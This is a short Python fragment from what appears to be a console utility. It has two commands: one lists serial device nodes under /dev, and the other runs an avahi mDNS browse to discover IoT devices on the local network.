def cmd_serial_monitor(ctx):
    if not shutil.which("pyserial"):
        ctx["console"].print("[yellow]pyserial not installed. Install with: pip install pyserial[/]")
    devices = []
    if os.path.isdir("/dev"):
        devices = sorted(p for p in os.listdir("/dev") if p.startswith("tty.") or p.startswith("cu."))
    if not devices:
        # Windows / generic fallback
        ctx["console"].print("No /dev/tty.* devices detected (Windows or no serial hardware).")
    else:
        rows = [(d, os.path.exists(os.path.join("/dev", d))) for d in devices]
        _print_table(ctx, rows, ("Device", "Exists"))


def cmd_iot_discovery(ctx):
    ctx["console"].print(f"[{ctx['theme'].primary}]Quick mDNS browse (avahi):[/]")
    code, out, err = _safe_run(["avahi-browse", "-art"], timeout=8)
    ctx["console"].print(out or err or "Install avahi-tools to use mDNS browsing.")


